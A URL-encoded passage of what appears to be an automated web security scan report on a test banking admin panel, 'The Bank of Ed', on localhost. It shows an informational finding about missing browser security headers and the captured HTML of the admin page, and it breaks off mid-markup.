20%3Cspan%3ESave%20Settings%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-4%20h-4%20animate-spin%20hidden%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Ccircle%20class%3D%5C%22opacity-25%5C%22%20cx%3D%5C%2212%5C%22%20cy%3D%5C%2212%5C%22%20r%3D%5C%2210%5C%22%20stroke%3D%5C%22currentColor%5C%22%20stroke-width%3D%5C%224%5C%22%20fill%3D%5C%22none%5C%22%3E%3C%2Fcircle%3E%3Cpath%20class%3D%5C%22opacity-75%5C%22%20fill%3D%5C%22currentColor%5C%22%20d%3D%5C%22M4%2012a8%208%200%20018-8V0C5.373%200%200%205.373%200%2012h4z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fform%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%20%20%3C!--%20Reset%20Database%20Card%20--%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-sm%20border%20border-red-200%20p-6%20sm%3Ap-8%20max-w-xl%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20gap-3%20mb-4%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-12%20h-12%20bg-red-100%20rounded-full%20flex%20items-center%20justify-center%20flex-shrink-0%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-6%20h-6%20text-red-600%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M12%209v2m0%204h.01m-6.938%204h13.856c1.54%200%202.502-1.667%201.732-3L13.732%204c-.77-1.333-2.694-1.333-3.464%200L3.34%2016c-.77%201.333.192%203%201.732%203z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch2%20class%3D%5C%22text-xl%20font-bold%20text-dark-900%5C%22%3EReset%20Database%3C%2Fh2%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-sm%20text-dark-500%5C%22%3EDrop%20and%20recreate%20the%20entire%20database%20with%20seed%20data%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22bg-red-50%20border%20border-red-200%20rounded-xl%20p-4%20mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-red-800%20text-sm%20font-medium%5C%22%3EWarning%3A%20This%20action%20is%20irreversible%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-red-600%20text-xs%20mt-1%5C%22%3EAll%20customer%20data%2C%20accounts%2C%20and%20transactions%20will%20be%20permanently%20deleted%20and%20replaced%20with%20default%20seed%20data.%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-sm%20text-dark-600%20mb-3%5C%22%3EType%20%3Cstrong%3ERESET%3C%2Fstrong%3E%20below%20to%20confirm%3A%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%5C%22text%5C%22%20id%3D%5C%22reset-confirm-input%5C%22%20class%3D%5C%22w-full%20px-4%20py-3%20rounded-xl%20border%20border-dark-200%20focus%3Aring-2%20focus%3Aring-red-500%20focus%3Aborder-red-500%20outline-none%20transition%20font-mono%20tracking-widest%20text-center%20text-lg%20mb-4%5C%22%20placeholder%3D%5C%22Type%20RESET%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20id%3D%5C%22reset-btn%5C%22%20onclick%3D%5C%22BankOfEdAdmin.SystemPage.handleReset()%5C%22%20class%3D%5C%22w-full%20bg-red-600%20hover%3Abg-red-700%20text-white%20font-semibold%20py-3%20rounded-xl%20transition-colors%20flex%20items-center%20justify-center%20gap-2%20disabled%3Aopacity-50%20disabled%3Acursor-not-allowed%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%3EReset%20Database%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-4%20h-4%20animate-spin%20hidden%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Ccircle%20class%3D%5C%22opacity-25%5C%22%20cx%3D%5C%2212%5C%22%20cy%3D%5C%2212%5C%22%20r%3D%5C%2210%5C%22%20stroke%3D%5C%22currentColor%5C%22%20stroke-width%3D%5C%224%5C%22%20fill%3D%5C%22none%5C%22%3E%3C%2Fcircle%3E%3Cpath%20class%3D%5C%22opacity-75%5C%22%20fill%3D%5C%22currentColor%5C%22%20d%3D%5C%22M4%2012a8%208%200%20018-8V0C5.373%200%200%205.373%200%2012h4z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fsection%3E%5Cn%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%3C%2Fmain%3E%5Cn%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%3C!--%20Scripts%20--%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Futils.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fapi.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Frouter.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fpages%2Fauth.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fpages%2Fcustomers.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fpages%2Faccounts.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fpages%2Fsystem.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fpages%2Ffx-rates.js%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%20src%3D%5C%22js%2Fapp.js%5C%22%3E%3C%2Fscript%3E%5Cn%3C%2Fbody%3E%5Cn%3C%2Fhtml%3E%5Cn%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22skipped%22%2C%22validation_note%22%3A%22Not%20validated%3A%20severity%20'info'%20is%20below%20the%20configured%20threshold%20'low'.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A05%22%2C%22severity%22%3A%22info%22%2C%22title%22%3A%22Banking%20page%20lacks%20browser%20security%20headers%22%2C%22description%22%3A%22The%20admin%20page%20response%20omits%20Content-Security-Policy%2C%20X-Frame-Options%2C%20X-Content-Type-Options%2C%20and%20Referrer-Policy%20headers.%22%2C%22impact%22%3A%22The%20missing%20headers%20reduce%20browser-side%20protection%20against%20framing%2C%20content-type%20confusion%2C%20and%20script%20injection%20if%20another%20weakness%20exists.%22%2C%22likelihood%22%3A%22The%20configuration%20is%20confirmed%2C%20but%20these%20probes%20do%20not%20demonstrate%20a%20directly%20exploitable%20browser%20attack.%22%2C%22recommendation%22%3A%22Set%20an%20appropriate%20Content-Security-Policy%2C%20prevent%20unauthorized%20framing%20with%20frame-ancestors%2C%20add%20X-Content-Type-Options%3A%20nosniff%2C%20and%20define%20a%20restrictive%20Referrer-Policy.%22%2C%22cvss_score%22%3A0%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AH%2FPR%3AN%2FUI%3AR%2FS%3AU%2FC%3AN%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fadmin%2F%23%2Fcustomers%2F11%22%2C%22evidence%22%3A%22The%20200%20response%20contains%20HTML%20but%20none%20of%20the%20listed%20browser%20security%20headers.%5Cn%5CnREQUEST%3A%5CnGET%20http%3A%2F%2Flocalhost%3A8081%2Fadmin%2F%23%2Fcustomers%2F11%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%20200%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A34%3A23%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnlast-modified%3A%20Sun%2C%2023%20Aug%202026%2012%3A34%3A31%20GMT%5Cnetag%3A%20%5C%224c9c-659b6175aa3c0%5C%22%5Cnaccept-ranges%3A%20bytes%5Cncontent-length%3A%2019612%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20text%2Fhtml%5Cn%5Cn%3C!DOCTYPE%20html%3E%5Cn%3Chtml%20lang%3D%5C%22en%5C%22%3E%5Cn%3Chead%3E%5Cn%20%20%3Cmeta%20charset%3D%5C%22UTF-8%5C%22%3E%5Cn%20%20%3Cmeta%20name%3D%5C%22viewport%5C%22%20content%3D%5C%22width%3Ddevice-width%2C%20initial-scale%3D1.0%5C%22%3E%5Cn%20%20%3Ctitle%3EThe%20Bank%20of%20Ed%20-%20Admin%3C%2Ftitle%3E%5Cn%20%20%3Clink%20rel%3D%5C%22preconnect%5C%22%20href%3D%5C%22https%3A%2F%2Ffonts.googleapis.com%5C%22%3E%5Cn%20%20%3Clink%20rel%3D%5C%22preconnect%5C%22%20href%3D%5C%22https%3A%2F%2Ffonts.gstatic.com%5C%22%20crossorigin%3E%5Cn%20%20%3Clink%20href%3D%5C%22https%3A%2F%2Ffonts.googleapis.com%2Fcss2%3Ffamily%3DInter%3Awght%40300%3B400%3B500%3B600%3B700%26display%3Dswap%5C%22%20rel%3D%5C%22stylesheet%5C%22%3E%5Cn%20%20%3Cscript%20src%3D%5C%22https%3A%2F%2Fcdn.tailwindcss.com%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%3E%5Cn%20%20%20%20tailwind.config%20%3D%20%7B%5Cn%20%20%20%20%20%20theme%3A%20%7B%5Cn%20%20%20%20%20%20%20%20extend%3A%20%7B%5Cn%20%20%20%20%20%20%20%20%20%20colors%3A%20%7B%5Cn%20%20%20%20%20%20%20%20%20%20%20%20dark%3A%20%7B%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%2050%3A%20'%23f4f4f5'%2C%20100%3A%20'%23e4e4e7'%2C%20200%3A%20'%23d4d4d8'%2C%20300%3A%20'%23a1a1aa'%2C%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20400%3A%20'%2371717a'%2C%20500%3A%20'%2352525b'%2C%20600%3A%20'%233f3f46'%2C%20700%3A%20'%2327272a'%2C%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20800%3A%20'%2318181b'%2C%20900%3A%20'%2309090b'%2C%20950%3A%20'%23030305'%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%7D%5Cn%20%20%20%20%20%20%20%20%20%20%7D%2C%5Cn%20%20%20%20%20%20%20%20%20%20fontFamily%3A%20%7B%20sans%3A%20%5B'Inter'%2C%20'system-ui'%2C%20'sans-serif'%5D%20%7D%5Cn%20%20%20%20%20%20%20%20%7D%5Cn%20%20%20%20%20%20%7D%5Cn%20%20%20%20%7D%5Cn%20%20%3C%2Fscript%3E%5Cn%20%20%3Clink%20rel%3D%5C%22stylesheet%5C%22%20href%3D%5C%22css%2Fapp.css%5C%22%3E%5Cn%3C%2Fhead%3E%5Cn%3Cbody%20class%3D%5C%22bg-dark-50%20font-sans%20text-dark-800%5C%22%3E%5Cn%5Cn%20%20%3C!--%20Toast%20Container%20--%3E%5Cn%20%20%3Cdiv%20id%3D%5C%22toast-container%5C%22%20class%3D%5C%22fixed%20top-4%20right-4%20z-50%20space-y-2%5C%22%3E%3C%2Fdiv%3E%5Cn%5Cn%20%20%3C!--%20Modal%20Overlay%20--%3E%5Cn%20%20%3Cdiv%20id%3D%5C%22modal-overlay%5C%22%20class%3D%5C%22hidden%20fixed%20inset-0%20z-40%20bg-black%2F50%20backdrop-blur-sm%20flex%20items-center%20justify-center%20p-4%5C%22%3E%5Cn%20%20%20%20%3Cdiv%20id%3D%5C%22modal-content%5C%22%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-2xl%20w-full%20max-w-md%20max-h-%5B90vh%5D%20overflow-y-auto%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%3C!--%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20AUTH%20VIEW%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20--%3E%5Cn%20%20%3Cdiv%20id%3D%5C%22view-auth%5C%22%20class%3D%5C%22hidden%20min-h-screen%20flex%20items-center%20justify-center%20bg-gradient-to-br%20from-dark-900%20via-dark-800%20to-dark-950%20p-4%5C%22%3E%5Cn%20%20%20%20%3Cdiv%20class%3D%5C%22w-full%20max-w-md%5C%22%3E%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22text-center%20mb-8%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22inline-flex%20items-center%20gap-3%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-12%20h-12%20bg-red-600%20rounded-xl%20flex%20items-center%20justify-center%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-7%20h-7%20text-white%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M10.325%204.317c.426-1.756%202.924-1.756%203.35%200a1.724%201.724%200%20002.573%201.066c1.543-.94%203.31.826%202.37%202.37a1.724%201.724%200%20001.066%202.573c1.756.426%201.756%202.924%200%203.35a1.724%201.724%200%2000-1.066%202.573c.94%201.543-.826%203.31-2.37%202.37a1.724%201.724%200%2000-2.573%201.066c-.426%201.756-2.924%201.756-3.35%200a1.724%201.724%200%2000-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724%201.724%200%2000-1.066-2.573c-1.756-.426-1.756-2.924%200-3.35a1.724%201.724%200%20001.066-2.573c-.94-1.543.826-3.31%202.37-2.37.996.608%202.296.07%202.572-1.065z%5C%22%3E%3C%2Fpath%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M15%2012a3%203%200%2011-6%200%203%203%200%20016%200z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Ch1%20class%3D%5C%22text-3xl%20font-bold%20text-white%5C%22%3EThe%20Bank%20of%20Ed%3C%2Fh1%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-dark-400%20mt-2%5C%22%3EAdministration%20Panel%3C%2Fp%3E%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-2xl%20overflow-hidden%20p-8%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Cform%20id%3D%5C%22login-form%5C%22%20onsubmit%3D%5C%22BankOfEdAdmin.AuthPage.handleLogin(event)%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22space-y-5%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Clabel%20class%3D%5C%22block%20text-sm%20font-medium%20text-dark-700%20mb-1.5%5C%22%3EUsername%3C%2Flabel%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%5C%22text%5C%22%20name%3D%5C%22username%5C%22%20required%20class%3D%5C%22w-full%20px-4%20py-3%20rounded-xl%20border%20border-dark-200%20focus%3Aring-2%20focus%3Aring-red-500%20focus%3Aborder-red-500%20outline-none%20transition%5C%22%20placeholder%3D%5C%22admin%5C%22%20autofocus%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Clabel%20class%3D%5C%22block%20text-sm%20font-medium%20text-dark-700%20mb-1.5%5C%22%3EPassword%3C%2Flabel%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%5C%22password%5C%22%20name%3D%5C%22password%5C%22%20required%20class%3D%5C%22w-full%20px-4%20py-3%20rounded-xl%20border%20border-dark-200%20focus%3Aring-2%20focus%3Aring-red-500%20focus%3Aborder-red-500%20outline-none%20transition%5C%22%20placeholder%3D%5C%22Enter%20password%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22login-errors%5C%22%20class%3D%5C%22mt-4%20text-sm%20text-red-600%20hidden%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cbutton%20type%3D%5C%22submit%5C%22%20class%3D%5C%22w-full%20mt-6%20bg-red-600%20hover%3Abg-red-700%20text-white%20font-semibold%20py-3%20rounded-xl%20transition-colors%20flex%20items-center%20justify-center%20gap-2%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%3ESign%20In%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-4%20h-4%20animate-spin%20hidden%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Ccircle%20class%3D%5C%22opacity-25%5C%22%20cx%3D%5C%2212%5C%22%20cy%3D%5C%2212%5C%22%20r%3D%5C%2210%5C%22%20stroke%3D%5C%22currentColor%5C%22%20stroke-width%3D%5C%224%5C%22%20fill%3D%5C%22none%5C%22%3E%3C%2Fcircle%3E%3Cpath%20class%3D%5C%22opacity-75%5C%22%20fill%3D%5C%22currentColor%5C%22%20d%3D%5C%22M4%2012a8%208%200%20018-8V0C5.373%200%200%205.373%200%2012h4z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fform%3E%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%3C!--%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20APP%20SHELL%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20--%3E%5Cn%20%20%3Cdiv%20id%3D%5C%22app-shell%5C%22%20class%3D%5C%22hidden%20flex%20h-screen%20overflow-hidden%5C%22%3E%5Cn%5Cn%20%20%20%20%3C!--%20Mobile%20Header%20--%3E%5Cn%20%20%20%20%3Cdiv%20class%3D%5C%22lg%3Ahidden%20fixed%20top-0%20left-0%20right-0%20z-30%20bg-dark-900%20text-white%20flex%20items-center%20justify-between%20px-4%20py-3%5C%22%3E%5Cn%20%20%20%20%20%20%3Cbutton%20onclick%3D%5C%22BankOfEdAdmin.App.toggleSidebar()%5C%22%20class%3D%5C%22p-2%20hover%3Abg-dark-800%20rounded-lg%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-6%20h-6%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M4%206h16M4%2012h16M4%2018h16%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20gap-2%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-8%20h-8%20bg-red-600%20rounded-lg%20flex%20items-center%20justify-center%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%20text-white%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M10.325%204.317c.426-1.756%202.924-1.756%203.35%200a1.724%201.724%200%20002.573%201.066c1.543-.94%203.31.826%202.37%202.37a1.724%201.724%200%20001.066%202.573c1.756.426%201.756%202.924%200%203.35a1.724%201.724%200%2000-1.066%202.573c.94%201.543-.826%203.31-2.37%202.37a1.724%201.724%200%2000-2.573%201.066c-.426%201.756-2.924%201.756-3.35%200a1.724%201.724%200%2000-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724%201.724%200%2000-1.066-2.573c-1.756-.426-1.756-2.924%200-3.35a1.724%201.724%200%20001.066-2.573c-.94-1.543.826-3.31%202.37-2.37.996.608%202.296.07%202.572-1.065z%5C%22%3E%3C%2Fpath%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M15%2012a3%203%200%2011-6%200%203%203%200%20016%200z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3Cspan%20class%3D%5C%22font-semibold%5C%22%3EAdmin%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-10%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%3C!--%20Sidebar%20Overlay%20(mobile)%20--%3E%5Cn%20%20%20%20%3Cdiv%20id%3D%5C%22sidebar-overlay%5C%22%20onclick%3D%5C%22BankOfEdAdmin.App.toggleSidebar()%5C%22%20class%3D%5C%22hidden%20fixed%20inset-0%20z-30%20bg-black%2F50%20lg%3Ahidden%5C%22%3E%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%3C!--%20Sidebar%20--%3E%5Cn%20%20%20%20%3Caside%20id%3D%5C%22sidebar%5C%22%20class%3D%5C%22fixed%20lg%3Astatic%20inset-y-0%20left-0%20z-40%20w-64%20bg-dark-900%20text-white%20flex%20flex-col%20transform%20-translate-x-full%20lg%3Atranslate-x-0%20transition-transform%20duration-200%5C%22%3E%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22p-6%20flex%20items-center%20gap-3%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-10%20h-10%20bg-red-600%20rounded-xl%20flex%20items-center%20justify-center%20flex-shrink-0%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-6%20h-6%20text-white%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M10.325%204.317c.426-1.756%202.924-1.756%203.35%200a1.724%201.724%200%20002.573%201.066c1.543-.94%203.31.826%202.37%202.37a1.724%201.724%200%20001.066%202.573c1.756.426%201.756%202.924%200%203.35a1.724%201.724%200%2000-1.066%202.573c.94%201.543-.826%203.31-2.37%202.37a1.724%201.724%200%2000-2.573%201.066c-.426%201.756-2.924%201.756-3.35%200a1.724%201.724%200%2000-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724%201.724%200%2000-1.066-2.573c-1.756-.426-1.756-2.924%200-3.35a1.724%201.724%200%20001.066-2.573c-.94-1.543.826-3.31%202.37-2.37.996.608%202.296.07%202.572-1.065z%5C%22%3E%3C%2Fpath%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M15%2012a3%203%200%2011-6%200%203%203%200%20016%200z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Ch2%20class%3D%5C%22font-bold%20text-lg%5C%22%3EThe%20Bank%20of%20Ed%3C%2Fh2%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-xs%20text-dark-400%5C%22%3EAdmin%20Panel%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%20%20%3Cnav%20class%3D%5C%22flex-1%20px-3%20space-y-1%20mt-2%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Ca%20href%3D%5C%22%23%2Fcustomers%5C%22%20data-nav%3D%5C%22customers%5C%22%20class%3D%5C%22nav-link%20flex%20items-center%20gap-3%20px-4%20py-3%20rounded-xl%20text-dark-300%20hover%3Atext-white%20hover%3Abg-dark-800%20transition-colors%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M17%2020h5v-2a3%203%200%2000-5.356-1.857M17%2020H7m10%200v-2c0-.656-.126-1.283-.356-1.857M7%2020H2v-2a3%203%200%20015.356-1.857M7%2020v-2c0-.656.126-1.283.356-1.857m0%200a5.002%205.002%200%20019.288%200M15%207a3%203%200%2011-6%200%203%203%200%20016%200z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cspan%3ECustomers%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fa%3E%5Cn%20%20%20%20%20%20%20%20%3Ca%20href%3D%5C%22%23%2Faccounts%5C%22%20data-nav%3D%5C%22accounts%5C%22%20class%3D%5C%22nav-link%20flex%20items-center%20gap-3%20px-4%20py-3%20rounded-xl%20text-dark-300%20hover%3Atext-white%20hover%3Abg-dark-800%20transition-colors%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%2